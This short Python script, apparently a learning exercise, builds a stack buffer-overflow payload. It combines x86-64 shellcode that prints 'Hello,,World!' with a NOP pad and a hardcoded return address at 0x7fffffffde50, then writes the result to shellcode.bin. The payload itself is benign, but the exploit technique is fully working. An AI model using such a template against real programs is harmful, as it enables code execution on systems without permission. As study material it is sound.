from struct import *

shellcode = b"\xeb\x1e" \
b"\xb8\x01\x00\x00\x00" \
b"\xbf\x01\x00\x00\x00" \
b"\x5e" \
b"\xba\x0f\x00\x00\x00" \
b"\x0f\x05" \
b"\xb8\x3c\x00\x00\x00" \
b"\xbf\x00\x00\x00\x00" \
b"\x0f\x05" \
b"\xe8\xdd\xff\xff\xff" \
b"\x48\x65\x6c\x6c\x6f\x2c\x2c\x57\x6f\x72\x6c\x64\x21"

print(f'shellcode_len : {len(shellcode)}')

buff_addr = 0x7fffffffde50
ret_addr_addr = 0x7fffffffde98
pedded_shellcode_len = ret_addr_addr - buff_addr

print(f'padded_shellcode_len : {pedded_shellcode_len}')

padded_shellcode = shellcode + b'\x90'*(pedded_shellcode_len - len(shellcode))

buff_addr_bin = bytes(pack('<Q', buff_addr))
print(buff_addr_bin)
padded_shellcode += buff_addr_bin

print(padded_shellcode)

f = open('shellcode.bin', 'wb')
f.write(padded_shellcode)